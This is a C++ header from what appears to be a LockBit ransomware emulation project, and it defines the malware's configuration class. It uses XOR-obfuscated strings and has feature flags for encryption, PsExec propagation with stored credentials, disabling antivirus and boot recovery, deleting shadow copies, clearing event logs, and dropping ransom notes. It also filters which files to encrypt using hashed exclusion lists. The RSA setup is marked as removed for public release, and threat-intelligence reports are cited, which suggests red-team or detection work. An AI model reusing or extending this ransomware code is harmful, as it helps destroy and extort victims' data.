#pragma once

#include <filesystem>
#include <set>
#include <vector>
#include "crypto/djb2.hpp"
#include "crypto/xor_obfuscation.hpp"
#include "json.hpp"
#include "util/string_util.hpp"

using json = nlohmann::json;

/*
 * Defines the LockBit configuration structure and handles loading the configuration.
 */
class Config {
    public:
        // default constructor
        Config() {}

        Config(const char* input) {
            this->_config = json::parse(input);
            this->_excluded_filenames_hashed = getHashedStringSetSetting(XOR_LIT("excluded_filenames"));
            this->_excluded_dirs_hashed = getHashedStringSetSetting(XOR_LIT("excluded_dirs"));
            this->_excluded_extensions_hashed = getHashedStringSetSetting(XOR_LIT("excluded_ext"));
            this->_target_processes_hashed = getHashedStringSetSetting(XOR_LIT("target_processes"));
            this->_target_services = getStringListSetting(XOR_LIT("target_services"));
            this->_strict_include_ranges = getNarrowStringSetSetting(XOR_LIT("strict_include_ranges"));
            this->_strict_include_hosts = getStringSetSetting(XOR_LIT("strict_include_hosts"));
            this->_psexec_user = getStringSetting(XOR_LIT("psexec_user"));
            this->_psexec_pass = getStringSetting(XOR_LIT("psexec_pass"));
            this->_extension = getStringSetting(XOR_LIT("extension"));
            this->_ransom_note_contents = getStringSetting(XOR_LIT("note_contents"));
            this->_rsa_pub_der_base64 = getNarrowStringSetting(XOR_LIT("rsa_pub"));
            this->configureRSA();
        }

        bool EncryptionEnabled() {
            return getBoolSetting(XOR_LIT("enable_enc"));
        }

        bool EnumerationEnabled() {
            return getBoolSetting(XOR_LIT("enable_enum"));
        }

        bool PropagationEnabled() {
            return getBoolSetting(XOR_LIT("enable_prop"));
        }

        bool SelfDeleteEnabled() {
            return getBoolSetting(XOR_LIT("enable_self_del"));
        }

        bool DisableBootRecoveryEnabled() {
            return getBoolSetting(XOR_LIT("disable_boot_recovery"));
        }

        bool DisableSecurityToolsEnabled() {
            return getBoolSetting(XOR_LIT("disable_av"));
        }

        bool EmptyRecycleBinEnabled() {
            return getBoolSetting(XOR_LIT("empty_recycle"));
        }

        bool SystemLangCheckEnabled() {
            return getBoolSetting(XOR_LIT("check_ui_lang"));
        }

        bool MutexCheckEnabled() {
            return getBoolSetting(XOR_LIT("check_mutex"));
        }

        bool ProcessTerminationEnabled() {
            return getBoolSetting(XOR_LIT("terminate_processes"));
        }

        bool ServiceTerminationEnabled() {
            return getBoolSetting(XOR_LIT("terminate_services"));
        }

        bool WallpaperChangeEnabled() {
            return getBoolSetting(XOR_LIT("change_wallpaper"));
        }

        bool IconChangeEnabled() {
            return getBoolSetting(XOR_LIT("change_icon"));
        }

        bool EventLogDeletionEnabled() {
            return getBoolSetting(XOR_LIT("clear_evt_log"));
        }

        bool ShadowCopyDeletionEnabled() {
            return getBoolSetting(XOR_LIT("delete_shadow"));
        }

        /*
         * IsValidTargetFile:
         *      About:
         *          Checks if a given file path is a valid target file by checking its name and extension
         *          against exclusion sets from the given configuration.
         *          Name and extension comparisons are done using case-insensitive DJB2 hashes.
         *      Result:
         *          true if the file is a valid target, false otherwise.
         *      CTI:
         *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
         *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
         */
        bool IsValidTargetFile(const std::wstring& file_path) {
            // Check file name and extension against exclusion set
            std::filesystem::path p(file_path);
            std::string filename = p.filename().string();
            std::string ext = p.extension().string();
            if (this->_excluded_filenames_hashed.contains(djb2::djb2_case_insensitive(filename.c_str()))) {
                return false;
            }
            if (ext.length() > 0 && this->_excluded_extensions_hashed.contains(djb2::djb2_case_insensitive(ext.c_str()))) {
                return false;
            }
            return true;
        }

        /*
         * IsValidTargetDir:
         *      About:
         *          Checks if a given directory is a valid target directory by checking its name
         *          against exclusion sets from the given configuration. 
         *          Name comparison is done using case-insensitive DJB2 hashes.
         *      Result:
         *          true if the directory is a valid target, false otherwise.
         *      CTI:
         *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
         *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
         */
        bool IsValidTargetDir(const std::wstring& dir_name) {
            std::string dir_name_narrow = string_util::wstring_to_string(dir_name);
            unsigned long hashed_dir = djb2::djb2_case_insensitive(dir_name_narrow.c_str());
            return !this->_excluded_dirs_hashed.contains(hashed_dir) && dir_name != std::wstring(L".") && dir_name != std::wstring(L"..");
        }

        std::set<std::string> GetStrictIncludeRanges() {
            return this->_strict_include_ranges;
        }

        std::set<std::wstring> GetStrictIncludeHosts() {
            return this->_strict_include_hosts;
        }

        std::vector<std::wstring> GetTargetServices() {
            return this->_target_services;
        }

        std::set<unsigned long> GetHashedExcludedFilenames() {
            return this->_excluded_filenames_hashed;
        }

        std::set<unsigned long> GetHashedExcludedDirs() {
            return this->_excluded_dirs_hashed;
        }

        std::set<unsigned long> GetHashedExcludedExtensions() {
            return this->_excluded_extensions_hashed;
        }

        std::set<unsigned long> GetHashedTargetProcesses() {
            return this->_target_processes_hashed;
        }

        std::wstring GetPsExecUsername() {
            return this->_psexec_user;
        }

        std::wstring GetPsExecPassword() {
            return this->_psexec_pass;
        }

        std::wstring GetExtension() {
            return this->_extension;
        }

        std::wstring GetRansomNoteContents() {
            return this->_ransom_note_contents;
        }

        std::string GetPrimaryRsaPublicKeyDerBase64() {
            return this->_rsa_pub_der_base64;
        }

        std::vector<unsigned char> GetPrimaryRsaPublicKey() {
            return this->_rsa_primary_public_key;
        }

        std::vector<unsigned char> GetRsaPublicSessionKey() {
            return this->_rsa_gen_public_key;
        }

    private:
        json _config;
        std::vector<std::wstring> _target_services;
        std::set<unsigned long> _excluded_filenames_hashed;
        std::set<unsigned long> _excluded_dirs_hashed;
        std::set<unsigned long> _excluded_extensions_hashed;
        std::set<unsigned long> _target_processes_hashed;
        std::set<std::string> _strict_include_ranges;
        std::set<std::wstring> _strict_include_hosts;
        std::wstring _psexec_user;
        std::wstring _psexec_pass;
        std::wstring _extension;
        std::wstring _ransom_note_contents;
        std::string _rsa_pub_der_base64;
        std::vector<unsigned char> _rsa_primary_public_key;
        std::vector<unsigned char> _rsa_gen_public_key;

        bool getBoolSetting(const char* val) {
            if (this->_config.contains(val)) {
                return this->_config[val];
            } else {
                return false;
            }
        }

        std::set<unsigned long> getHashedStringSetSetting(const char* val) {
            std::set<unsigned long> values;
            if (this->_config.contains(val)) {
                for (auto& item: this->_config[val]) {
                    values.insert(djb2::djb2_case_insensitive(std::string(item).c_str()));
                }
            }
            return values;
        }

        std::vector<std::wstring> getStringListSetting(const char* val) {
            std::vector<std::wstring> values;
            if (this->_config.contains(val)) {
                for (auto& item: this->_config[val]) {
                    values.push_back(string_util::string_to_wstring(std::string(item)));
                }
            }
            return values;
        }

        std::set<std::wstring> getStringSetSetting(const char* val) {
            std::set<std::wstring> values;
            if (this->_config.contains(val)) {
                for (auto& item: this->_config[val]) {
                    values.insert(string_util::string_to_wstring(std::string(item)));
                }
            }
            return values;
        }

        std::set<std::string> getNarrowStringSetSetting(const char* val) {
            std::set<std::string> values;
            if (this->_config.contains(val)) {
                for (auto& item: this->_config[val]) {
                    values.insert(std::string(item));
                }
            }
            return values;
        }

        std::wstring getStringSetting(const char* val) {
            std::wstring value;
            if (this->_config.contains(val)) {
                return string_util::string_to_wstring(std::string(this->_config[val]));
            }
            return value;
        }

        std::string getNarrowStringSetting(const char* val) {
            std::string value;
            if (this->_config.contains(val)) {
                return std::string(this->_config[val]);
            }
            return value;
        }

        // Generate random RSA key pair to use for encrypting AES symmetric keys, and parse primary public
        // key from config file. If in cleanup mode, only parses primary private key from config file.
        void configureRSA() {
            /* Removed for public release */
            return;
        }
};

/*
 * GetConfig (defined in src/common/config/config.cpp):
 *      About:
 *          Fetches the configuration data stored as a resource and parses it into a Config object.
 *      Result:
 *          Returns Config object or throws exception on error.
 */
extern Config GetConfig();
